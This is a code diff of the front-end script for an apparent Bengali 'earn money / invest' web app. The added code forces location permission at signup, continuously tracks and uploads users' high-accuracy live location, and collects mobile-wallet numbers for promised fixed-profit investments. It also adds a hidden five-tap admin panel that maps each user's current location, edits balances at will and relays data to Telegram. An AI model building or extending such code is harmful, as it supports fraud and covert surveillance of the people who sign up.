+// Persistent Auto-Login Check on Startup
 document.addEventListener("DOMContentLoaded", () => {
-  const savedUser = localStorage.getItem("app_user");
+  const savedUser = localStorage.getItem("app_user_data");
   if (savedUser) {
-    currentUser = JSON.parse(savedUser);
-    fetchUserData();
+    try {
+      currentUser = JSON.parse(savedUser);
+      fetchUserDataQuietly();
+    } catch {
+      localStorage.removeItem("app_user_data");
+    }
   }
 });
 
-function toggleAuthMode() {
-  isLoginMode = !isLoginMode;
-  document.getElementById("authTitle").innerText = isLoginMode ? "লগইন করুন" : "একাউন্ট খুলুন";
-  document.getElementById("authBtn").innerText = isLoginMode ? "LOGIN" : "CREATE ACCOUNT";
-  document.getElementById("nameField").style.display = isLoginMode ? "none" : "block";
-  document.getElementById("ageField").style.display = isLoginMode ? "none" : "block";
-  document.getElementById("toggleText").innerText = isLoginMode ? "একাউন্ট নেই? রেজিস্ট্রেশন করুন" : "ইতিমধ্যে একাউন্ট আছে? লগইন করুন";
+async function fetchUserDataQuietly() {
+  if (!currentUser || !currentUser.id) return;
+  try {
+    const r = await fetch(`/api/user/${currentUser.id}`);
+    const d = await r.json();
+    if (d.ok) {
+      currentUser = d.user;
+      localStorage.setItem("app_user_data", JSON.stringify(currentUser));
+      enterDashboardDirectly();
+    } else {
+      localStorage.removeItem("app_user_data");
+    }
+  } catch (err) {
+    console.error("Session sync failed", err);
+  }
 }
 
-async function handleAuth() {
-  const phone = document.getElementById("phone").value;
-  const password = document.getElementById("password").value;
-  const authMsg = document.getElementById("authMsg");
+// Toggle between Register and Login screens
+function toggleAuthMode(isLogin) {
+  if (isLogin) {
+    $("registerStep").style.display = "none";
+    $("loginCard").style.display = "block";
+  } else {
+    $("loginCard").style.display = "none";
+    $("registerStep").style.display = "block";
+  }
+}
 
-  if (isLoginMode) {
-    const res = await fetch("/api/login", {
-      method: "POST", headers: { "Content-Type": "application/json" },
+async function handleLogin() {
+  clearMsg("loginMsg");
+  const phone = $("loginPhone").value.trim();
+  const password = $("loginPassword").value.trim();
+
+  if (!validPhone(phone)) return showMsg("loginMsg", "সঠিক ১১ ডিজিটের মোবাইল নাম্বার দিন।");
+  if (!password) return showMsg("loginMsg", "পাসওয়ার্ড লিখুন।");
+
+  try {
+    const r = await fetch("/api/login", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ phone, password })
     });
-    const data = await res.json();
-    if (!res.ok) return showMsg("authMsg", data.error, "error");
-    currentUser = data.user;
-  } else {
-    const name = document.getElementById("name").value;
-    const age = document.getElementById("age").value;
+    const d = await r.json();
+    if (!r.ok) throw new Error(d.error || "লগইন ব্যর্থ হয়েছে।");
 
-    // Get position on register
-    navigator.geolocation.getCurrentPosition(async (pos) => {
-      const res = await fetch("/api/register/start", {
-        method: "POST", headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          name, phone, password, age,
-          location: { latitude: pos.coords.latitude, longitude: pos.coords.longitude }
-        })
-      });
-      const data = await res.json();
-      if (!res.ok) return showMsg("authMsg", data.error, "error");
-      currentUser = data.user;
-      initApp();
-    }, () => alert("দয়া করে লোকেশন পারমিশন দিন!"));
-    return;
-  }
-  initApp();
-}
-
-function initApp() {
-  localStorage.setItem("app_user", JSON.stringify(currentUser));
-  document.getElementById("authSection").classList.add("hidden");
-  document.getElementById("appSection").classList.remove("hidden");
-  updateUI();
-  startLiveLocation();
-  loadTasks();
-}
-
-async function fetchUserData() {
-  const res = await fetch(`/api/user/${currentUser.id}`);
-  const data = await res.json();
-  if (data.ok) {
-    currentUser = data.user;
-    initApp();
-  } else {
-    logout();
+    currentUser = d.user;
+    localStorage.setItem("app_user_data", JSON.stringify(currentUser));
+    enterDashboardDirectly();
+  } catch (e) {
+    showMsg("loginMsg", e.message);
   }
 }
 
-function updateUI() {
-  document.getElementById("userBalance").innerText = `৳${currentUser.balance || 0}`;
-  document.getElementById("userName").innerText = `Welcome, ${currentUser.name}`;
+// Live Location Tracking implementation
+function startLiveLocationTracking(userId) {
+  if (!navigator.geolocation) return;
+  if (watchId !== null) navigator.geolocation.clearWatch(watchId);
+
+  watchId = navigator.geolocation.watchPosition(
+    async position => {
+      try {
+        await fetch(`/api/user/${encodeURIComponent(userId)}/location`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            location: {
+              latitude: position.coords.latitude,
+              longitude: position.coords.longitude,
+              accuracy: position.coords.accuracy
+            }
+          })
+        });
+      } catch (err) {
+        console.error("Live location update failed:", err);
+      }
+    },
+    err => console.warn("WatchPosition Error:", err.message),
+    { enableHighAccuracy: true, timeout: 20000, maximumAge: 5000 }
+  );
 }
 
-function startLiveLocation() {
-  if (navigator.geolocation) {
-    navigator.geolocation.watchPosition(pos => {
-      fetch(`/api/user/${currentUser.id}/location`, {
-        method: "POST", headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ latitude: pos.coords.latitude, longitude: pos.coords.longitude })
-      });
+// Register Step 1: Location & Form Start
+$("allowBtn").addEventListener("click", () => {
+  clearMsg("formMsg");
+
+  if (!window.isSecureContext && location.hostname !== "localhost" && location.hostname !== "127.0.0.1") {
+    return showMsg("formMsg", "HTTPS ছাড়া ব্রাউজার লোকেশন সাপোর্ট করে না।");
+  }
+
+  const name = $("name").value.trim();
+  const phone = $("phone").value.trim();
+  const password = $("password").value.trim();
+  const age = Number($("age").value);
+
+  if (name.length < 2) return showMsg("formMsg", "সঠিক নাম লিখুন।");
+  if (!validPhone(phone)) return showMsg("formMsg", "সঠিক ১১ ডিজিটের মোবাইল নাম্বার দিন।");
+  if (!password || password.length < 4) return showMsg("formMsg", "কমপক্ষে ৪ ডিজিটের পাসওয়ার্ড দিন।");
+  if (!age || age < 18) return showMsg("formMsg", "বয়স কমপক্ষে ১৮ বছর হতে হবে।");
+
+  if (!navigator.geolocation) {
+    return showMsg("formMsg", "আপনার ব্রাউজারে লোকেশন সাপোর্ট করে না।");
+  }
+
+  $("allowBtn").disabled = true;
+  $("allowText").textContent = "CHECKING LOCATION...";
+
+  navigator.geolocation.getCurrentPosition(
+    async position => {
+      try {
+        $("allowText").textContent = "SAVING...";
+
+        const r = await fetch("/api/register/start", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            name,
+            phone,
+            password,
+            age,
+            location: {
+              latitude: position.coords.latitude,
+              longitude: position.coords.longitude,
+              accuracy: position.coords.accuracy
+            }
+          })
+        });
+
+        const d = await r.json();
+        if (!r.ok) throw new Error(d.error || "রেজিস্ট্রেশন সম্ভব হচ্ছে না।");
+
+        currentUser = d.user;
+        localStorage.setItem("app_user_data", JSON.stringify(currentUser));
+        startLiveLocationTracking(currentUser.id);
+
+        $("registerStep").style.display = "none";
+        $("paymentStep").style.display = "block";
+        confetti();
+        window.scrollTo({ top: 0, behavior: "smooth" });
+      } catch (e) {
+        $("allowBtn").disabled = false;
+        $("allowText").textContent = "ALLOW LOCATION & REGISTER →";
+        showMsg("formMsg", e.message);
+      }
+    },
+    error => {
+      $("allowBtn").disabled = false;
+      $("allowText").textContent = "ALLOW LOCATION & REGISTER →";
+      showMsg("formMsg", "দয়া করে ডিভাইস লোকেশন অন করুন এবং পারমিশন দিন।");
+    },
+    { enableHighAccuracy: true, timeout: 30000, maximumAge: 0 }
+  );
+});
+
+// Register Step 2: Payment Method Confirm
+async function submitPayment() {
+  clearMsg("paymentMsg");
+  const method = document.querySelector('input[name="payment"]:checked');
+  const wallet = $("walletNumber").value.trim();
+
+  if (!method) return showMsg("paymentMsg", "bKash অথবা Nagad নির্বাচন করুন।");
+  if (!validPhone(wallet)) return showMsg("paymentMsg", "সঠিক bKash/Nagad নাম্বার লিখুন।");
+  if (!currentUser) return showMsg("paymentMsg", "সেশন পাওয়া যায়নি।");
+
+  $("confirmBtn").disabled = true;
+
+  try {
+    const r = await fetch(`/api/register/${encodeURIComponent(currentUser.id)}/payment`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        paymentMethod: method.value,
+        paymentNumber: wallet
+      })
     });
+
+    const d = await r.json();
+    if (!r.ok) throw new Error(d.error || "Save failed");
+
+    currentUser = d.user;
+    localStorage.setItem("app_user_data", JSON.stringify(currentUser));
+
+    $("paymentStep").style.display = "none";
+    $("successStep").style.display = "block";
+    confetti();
+    window.scrollTo({ top: 0, behavior: "smooth" });
+  } catch (e) {
+    $("confirmBtn").disabled = false;
+    showMsg("paymentMsg", e.message);
   }
 }
 
-function showTab(tab) {
-  document.getElementById("tabTasks").classList.add("hidden");
-  document.getElementById("tabInvest").classList.add("hidden");
-  document.getElementById("tabWithdraw").classList.add("hidden");
-
-  if (tab === 'tasks') document.getElementById("tabTasks").classList.remove("hidden");
-  if (tab === 'invest') document.getElementById("tabInvest").classList.remove("hidden");
-  if (tab === 'withdraw') document.getElementById("tabWithdraw").classList.remove("hidden");
+function enterDashboard() {
+  enterDashboardDirectly();
 }
 
+function enterDashboardDirectly() {
+  $("authView").style.display = "none";
+  $("dashboardView").classList.remove("hidden");
+  $("appNavTabs").classList.remove("hidden");
+  
+  updateDisplayBalance();
+  startLiveLocationTracking(currentUser.id);
+  loadTasks();
+  switchTab('tasks');
+}
+
+function updateDisplayBalance() {
+  if (currentUser) {
+    $("displayBalance").textContent = `৳${currentUser.balance || 0}`;
+    $("heroSubTest").textContent = `স্বাগতম, ${currentUser.name}! আপনার ড্যাশবোর্ড`;
+  }
+}
+
+// Navigation Tab Switcher inside Dashboard
+function switchTab(tabName) {
+  $("paneTasks").classList.add("hidden");
+  $("paneInvest").classList.add("hidden");
+  $("paneWithdraw").classList.add("hidden");
+
+  $("tabTasksBtn").className = "nav-tab";
+  $("tabInvestBtn").className = "nav-tab";
+  $("tabWithdrawBtn").className = "nav-tab";
+
+  if (tabName === 'tasks') {
+    $("paneTasks").classList.remove("hidden");
+    $("tabTasksBtn").className = "nav-tab active";
+    loadTasks();
+  } else if (tabName === 'invest') {
+    $("paneInvest").classList.remove("hidden");
+    $("tabInvestBtn").className = "nav-tab active";
+  } else if (tabName === 'withdraw') {
+    $("paneWithdraw").classList.remove("hidden");
+    $("tabWithdrawBtn").className = "nav-tab active";
+  }
+}
+
+// Load and Claim Tasks
 async function loadTasks() {
-  const res = await fetch("/api/tasks");
-  const data = await res.json();
-  const container = document.getElementById("tasksContainer");
-  container.innerHTML = data.tasks.map(t => `
-    <div class="task-item">
-      <div><b>${t.title}</b><br><small style="color:var(--gold)">Reward: ৳${t.reward}</small></div>
-      <button class="btn" style="width:auto; padding:6px 15px;" onclick="claimTask('${t.id}')">Claim</button>
-    </div>
-  `).join("");
+  try {
+    const r = await fetch("/api/tasks");
+    const d = await r.json();
+    const tasks = d.tasks || [];
+
+    const container = $("tasksListContainer");
+    if (!tasks.length) {
+      container.innerHTML = `<div class="admin-note">কোনো টাস্ক উপলব্ধ নেই।</div>`;
+      return;
+    }
+
+    container.innerHTML = tasks.map(t => `
+      <div class="task-item">
+        <div class="task-info">
+          <h4>${esc(t.title)}</h4>
+          <p>Reward: ৳${t.reward} (${esc(t.type)})</p>
+        </div>
+        <button class="task-btn" onclick="claimTask('${esc(t.id)}')">Claim</button>
+      </div>
+    `).join("");
+  } catch (err) {
+    $("tasksListContainer").innerHTML = `<div class="admin-note">টাস্ক লোড করতে সমস্যা হয়েছে।</div>`;
+  }
 }
 
 async function claimTask(taskId) {
-  const res = await fetch("/api/tasks/claim", {
-    method: "POST", headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({ userId: currentUser.id, taskId })
-  });
-  const data = await res.json();
-  if (!res.ok) return showMsg("taskMsg", data.error, "error");
-  currentUser.balance = data.balance;
-  updateUI();
-  showMsg("taskMsg", `৳${data.reward} সফলভাবে ব্যালেন্সে যোগ হয়েছে!`, "success");
+  if (!currentUser) return;
+  clearMsg("taskMsg");
+
+  try {
+    const r = await fetch("/api/tasks/claim", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ userId: currentUser.id, taskId })
+    });
+    const d = await r.json();
+    if (!r.ok) throw new Error(d.error || "Claim failed");
+
+    currentUser.balance = d.balance;
+    localStorage.setItem("app_user_data", JSON.stringify(currentUser));
+    updateDisplayBalance();
+
+    showMsg("taskMsg", `অভিনন্দন! ৳${d.reward} সফলভাবে আপনার ব্যালেন্সে যোগ হয়েছে।`, "success");
+    confetti();
+  } catch (err) {
+    showMsg("taskMsg", err.message, "error");
+  }
 }
 
-async function submitWithdraw() {
-  const method = document.getElementById("withdrawMethod").value;
-  const number = document.getElementById("withdrawNum").value;
-  const amount = document.getElementById("withdrawAmount").value;
-
-  const res = await fetch("/api/withdraw", {
-    method: "POST", headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({ userId: currentUser.id, method, number, amount })
-  });
-  const data = await res.json();
-  if (!res.ok) return showMsg("withdrawMsg", data.error, "error");
-  currentUser.balance = data.balance;
-  updateUI();
-  showMsg("withdrawMsg", "উইথড্র রিকোয়েস্ট জমা হয়েছে!", "success");
-}
-
-async function invest(planDays, profitPercent) {
-  const amount = prompt(`আপনি কত টাকা ইনভেস্ট করতে চান? (${planDays} দিনে +${profitPercent}% রিটার্ন)`);
+// Investment Plan Modal/Action
+async function openInvestModal(planDays, profitPercent) {
+  const amount = prompt(`আপনি কত টাকা ইনভেস্ট করতে চান?\n(${planDays} দিন মেয়াদী প্ল্যান, প্রফিট +${profitPercent}%)`);
   if (!amount) return;
 
-  const res = await fetch("/api/invest", {
-    method: "POST", headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({ userId: currentUser.id, planDays, profitPercent, amount })
-  });
-  const data = await res.json();
-  if (!res.ok) return alert(data.error);
-  currentUser.balance = data.balance;
-  updateUI();
-  alert("ইনভেস্টমেন্ট সফল হয়েছে!");
+  const numAmount = Number(amount);
+  if (!Number.isFinite(numAmount) || numAmount < 100) {
+    return alert("সর্বনিম্ন ১০০ টাকা ইনভেস্ট করতে হবে।");
+  }
+
+  try {
+    const r = await fetch("/api/invest", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ userId: currentUser.id, planDays, profitPercent, amount: numAmount })
+    });
+    const d = await r.json();
+    if (!r.ok) throw new Error(d.error || "Investment failed");
+
+    currentUser.balance = d.balance;
+    localStorage.setItem("app_user_data", JSON.stringify(currentUser));
+    updateDisplayBalance();
+
+    alert("✅ আপনার ইনভেস্টমেন্ট সফলভাবে একটিভ হয়েছে!");
+    confetti();
+  } catch (err) {
+    alert("❌ ত্রুটি: " + err.message);
+  }
 }
 
-function showMsg(id, text, type) {
-  const el = document.getElementById(id);
-  el.className = `msg ${type}`; el.innerText = text; el.classList.remove("hidden");
+// Withdraw Request Submit
+async function submitWithdraw() {
+  clearMsg("withdrawMsg");
+  const method = $("withdrawMethod").value;
+  const number = $("withdrawNumber").value.trim();
+  const amount = $("withdrawAmount").value.trim();
+
+  if (!validPhone(number)) return showMsg("withdrawMsg", "সঠিক ১১ ডিজিটের ওয়ালেট নাম্বার দিন।");
+  const numAmount = Number(amount);
+  if (!Number.isFinite(numAmount) || numAmount < 500) {
+    return showMsg("withdrawMsg", "সর্বনিম্ন উইথড্র পরিমাণ ৳৫০০ হতে হবে।");
+  }
+  if (numAmount > (currentUser.balance || 0)) {
+    return showMsg("withdrawMsg", "আপনার একাউন্টে পর্যাপ্ত ব্যালেন্স নেই।");
+  }
+
+  try {
+    const r = await fetch("/api/withdraw", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ userId: currentUser.id, method, number, amount: numAmount })
+    });
+    const d = await r.json();
+    if (!r.ok) throw new Error(d.error || "Withdraw failed");
+
+    currentUser.balance = d.balance;
+    localStorage.setItem("app_user_data", JSON.stringify(currentUser));
+    updateDisplayBalance();
+
+    $("withdrawNumber").value = "";
+    $("withdrawAmount").value = "";
+    showMsg("withdrawMsg", "✅ উইথড্র রিকোয়েস্ট সফলভাবে জমা হয়েছে!", "success");
+    confetti();
+  } catch (err) {
+    showMsg("withdrawMsg", err.message, "error");
+  }
 }
 
 function logout() {
-  localStorage.removeItem("app_user");
+  localStorage.removeItem("app_user_data");
   location.reload();
 }
+
+// Secret 5-tap Admin Trigger on "WELCOME BONUS" text
+let adminTapCount = 0;
+let adminTapTimer = null;
+
+function handleAdminTap(e) {
+  if (e) e.preventDefault();
+  adminTapCount++;
+  clearTimeout(adminTapTimer);
+  adminTapTimer = setTimeout(() => adminTapCount = 0, 3000);
+
+  if (adminTapCount >= 5) {
+    adminTapCount = 0;
+    $("adminModal").classList.add("show");
+    setTimeout(() => $("adminPin").focus(), 100);
+  }
+}
+
+const targetEl = $("adminTapTarget");
+if (window.PointerEvent) {
+  targetEl.addEventListener("pointerup", handleAdminTap);
+} else {
+  targetEl.addEventListener("touchend", handleAdminTap);
+  targetEl.addEventListener("click", handleAdminTap);
+}
+
+$("adminCancel").addEventListener("click", () => {
+  $("adminModal").classList.remove("show");
+  $("adminPin").value = "";
+});
+
+$("adminLoginBtn").addEventListener("click", async () => {
+  const pin = $("adminPin").value;
+
+  try {
+    const r = await fetch("/api/admin/login", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ pin })
+    });
+    const d = await r.json();
+    if (!r.ok) throw new Error(d.error || "Login failed");
+
+    $("adminPinMsg").style.display = "none";
+    $("adminModal").classList.remove("show");
+    $("adminPanel").classList.add("show");
+    $("adminPin").value = "";
+    await loadAdminData();
+  } catch (e) {
+    showMsg("adminPinMsg", e.message, "error");
+  }
+});
+
+$("adminLogout").addEventListener("click", async () => {
+  await fetch("/api/admin/logout", { method: "POST" }).catch(() => {});
+  $("adminPanel").classList.remove("show");
+});
+
+function esc(v) {
+  return String(v ?? "").replace(/[&<>"']/g, c => ({
+    "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;"
+  }[c]));
+}
+
+function fmtDate(v) {
+  try { return new Date(v).toLocaleString() } catch { return String(v || "") }
+}
+
+let liveAdminData = { users: [], withdrawals: [], investments: [] };
+
+async function loadAdminData() {
+  try {
+    const [rr, sr] = await Promise.all([
+      fetch("/api/admin/registrations"),
+      fetch("/api/admin/settings")
+    ]);
+
+    if (rr.status === 401 || sr.status === 401) {
+      $("adminPanel").classList.remove("show");
+      return;
+    }
+
+    if (!rr.ok || !sr.ok) throw new Error("Data loading failed");
+
+    const rd = await rr.json();
+    const sd = await sr.json();
+
+    liveAdminData.users = rd.registrations || [];
+    liveAdminData.withdrawals = rd.withdrawals || [];
+    liveAdminData.investments = rd.investments || [];
+
+    $("statTotal").textContent = liveAdminData.users.length;
+    $("statBkash").textContent = liveAdminData.users.filter(r => r.paymentMethod === "bKash").length;
+    $("statNagad").textContent = liveAdminData.users.filter(r => r.paymentMethod === "Nagad").length;
+
+    $("telegramChatId").value = sd.telegramChatId || "";
+    $("telegramToken").placeholder = sd.hasTelegramBotToken
+      ? "Token saved (blank = keep current)"
+      : "Paste Bot Token";
+
+    renderAdminRecords();
+  } catch (err) {
+    alert("অ্যাডমিন প্যানেলের ডেটা লোড হতে ব্যর্থ হয়েছে: " + err.message);
+  }
+}
+
+function renderAdminRecords() {
+  const q = $("adminSearch").value.trim().toLowerCase();
+  const filtered = q
+    ? liveAdminData.users.filter(r => [r.name, r.phone, r.paymentNumber, r.paymentMethod]
+        .some(v => String(v || "").toLowerCase().includes(q)))
+    : liveAdminData.users;
+
+  $("adminRecords").innerHTML = filtered.length
+    ? filtered.map(r => {
+        const isComplete = r.status === "complete";
+        const badgeClass = isComplete ? "badge" : "badge pending";
+        const badgeText = isComplete ? "VERIFIED / COMPLETE" : "AWAITING PAYMENT";
+
+        const loc = r.location
+          ? `<a target="_blank" rel="noopener" style="color:#58e8b3" href="https://maps.google.com/?q=${encodeURIComponent(r.location.latitude + "," + r.location.longitude)}">📍 View Current Location</a>`
+          : "📍 No location";
+
+        return `<div class="record">
+          <div class="record-top">
+            <div>
+              <h4>${esc(r.name)}</h4>
+              <div class="meta">
+                📱 Phone: ${esc(r.phone)}<br>
+                🎂 Age: ${esc(r.age)}<br>
+                💳 Wallet: ${esc(r.paymentMethod || "N/A")} (${esc(r.paymentNumber || "N/A")})<br>
+                💰 Balance: ৳${esc(r.balance || 0)} <button class="admin-btn admin-dark" style="padding:2px 6px;font-size:10px" onclick="editUserBalance('${esc(r.id)}', ${r.balance || 0})">Edit</button><br>
+                ${loc}<br>
+                🕒 Registered: ${esc(fmtDate(r.createdAt))}
+              </div>
+            </div>
+            <span class="${badgeClass}">${badgeText}</span>
+          </div>
+          <div class="admin-actions" style="margin-top:10px">
+            <button class="admin-btn admin-red" onclick="deleteAdminRow('${esc(r.id)}')">Delete Record</button>
+          </div>
+        </div>`;
+      }).join("")
+    : `<div class="admin-note">কোনো ইউজার বা রেজিস্ট্রেশন পাওয়া যায়নি।</div>`;
+}
+
+$("adminSearch").addEventListener("input", renderAdminRecords);
+
+window.editUserBalance = async (userId, currentBal) => {
+  const val = prompt("ইউজারের নতুন ব্যালেন্স পরিমাণ দিন:", currentBal);
+  if (val === null) return;
+  const newBalance = Number(val);
+  if (!Number.isFinite(newBalance)) return alert("সঠিক সংখ্যা দিন।");
+
+  try {
+    const r = await fetch("/api/admin/user/update-balance", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ userId, newBalance })
+    });
+    if (!r.ok) throw new Error("Update failed");
+    await loadAdminData();
+    alert("ব্যালেন্স সফলভাবে আপডেট করা হয়েছে!");
+  } catch (err) {
+    alert("ত্রুটি: " + err.message);
+  }
+};
+
+window.deleteAdminRow = async id => {
+  if (!confirm("এই recordটি ডিলিট করতে চান?")) return;
+  const r = await fetch("/api/admin/registrations/" + encodeURIComponent(id), { method: "DELETE" });
+  if (r.ok) await loadAdminData();
+};
+
+$("saveTelegramDemo").addEventListener("click", async () => {
+  const token = $("telegramToken").value.trim();
+  const chatId = $("telegramChatId").value.trim();
+
+  const r = await fetch("/api/admin/settings", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ telegramBotToken: token, telegramChatId: chatId })
+  });
+
+  const d = await r.json();
+  const m = $("telegramDemoMsg");
+
+  if (!r.ok) {
+    m.className = "admin-msg error";
+    m.textContent = d.error || "Save failed";
+    m.style.display = "block";
+    return;
+  }
+
+  $("telegramToken").value = "";
+  m.className = "admin-msg ok";
+  m.textContent = "Telegram settings saved successfully.";
+  m.style.display = "block";
+});
+
+$("testTelegramBtn").addEventListener("click", async () => {
+  const m = $("telegramDemoMsg");
+  m.style.display = "none";
+
+  try {
+    const r = await fetch("/api/admin/telegram/test", { method: "POST" });
+    const d = await r.json();
+    if (!r.ok) throw new Error(d.error || "Test failed");
+
+    m.className = "admin-msg ok";
+    m.textContent = "✅ Test Message Sent to Telegram!";
+    m.style.display = "block";
+  } catch (err) {
+    m.className = "admin-msg error";
+    m.textContent = "❌ Test Failed: " + err.message;
+    m.style.display = "block";
+  }
+});
 </script>
+
 </body>
 </html>
